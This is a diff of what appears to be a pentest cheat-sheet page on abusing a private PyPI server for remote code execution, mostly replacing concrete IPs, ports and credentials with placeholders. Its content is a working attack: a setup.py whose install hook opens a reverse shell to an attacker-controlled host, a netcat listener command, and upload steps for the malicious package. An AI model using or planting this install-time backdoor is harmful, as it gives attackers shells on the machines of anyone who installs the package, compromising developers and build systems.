@@ -4,38 +4,37 @@ date: 2024-7-19
 tags: ["python", "pypi", "package", "rce"]
 ---
 
----
 ### Abuse #1: Remote Pypi Server
 
 #### 1. Create files
 
 <div>
 
-```bash
+```console
 mkdir evil_package
 ```
 
-```bash
+```console
 mkdir evil_package/evil_package
 ```
 
-```bash
+```console
 cd evil_package
 ```
 
-```bash
+```console
 touch README.md
 ```
 
-```bash
+```console
 touch evil_package/__init__.py
 ```
 
-```bash
+```console
 touch setup.cfg
 ```
 
-```bash
+```console
 touch setup.py
 ```
 
@@ -45,7 +44,7 @@ touch setup.py
 
 <div>
 
-```python
+```console
 #!/usr/bin/env python3
 
 from setuptools.command.install import install
@@ -57,7 +56,7 @@ import subprocess
 class Exploit(install):
     def run(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("10.10.14.10",1337)) # CHANGE HERE
+        s.connect(("<LOCAL_IP>",<LOCAL_PORT>)) # CHANGE HERE
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
@@ -67,8 +66,8 @@ setup(name="evil_package",
       version="1.0.0",
       description="Evil Package",
       author="user",
-      author_email="user@example.com",
-      url="http://example.com",
+      author_email="user@<DOMAIN>",
+      url="http://<DOMAIN>",
       license="MIT",
       zip_safe=False,
       cmdclass={"install": Exploit})
@@ -80,14 +79,14 @@ setup(name="evil_package",
 
 <div>
 
-```bash
+```console
 [distutils]
 index-servers =
-  example
-[example]
-repository: http://pypi.example.com
-username: user
-password: password
+  <EXAMPLE>
+[<EXAMPLE>]
+repository: http://<TARGET_DOMAIN>
+username: <USER>
+password: <PASSWORD>
 ```
 
 </div>
@@ -96,9 +95,9 @@ password: password
 
 <div>
 
-```bash
+```console
 # Open a nc listener
-rlwrap nc -lvnp 1337
+rlwrap nc -lvnp <LOCAL_PORT>
 ```
 
 </div>
@@ -107,14 +106,14 @@ rlwrap nc -lvnp 1337
 
 <div>
 
-```bash
+```console
 # Create an archive
 python3 setup.py sdist
 ```
 
-```bash
+```console
 # Upload
-python3 setup.py sdist upload -r example
+python3 setup.py sdist upload -r <EXAMPLE>
 ```
 
 </div>
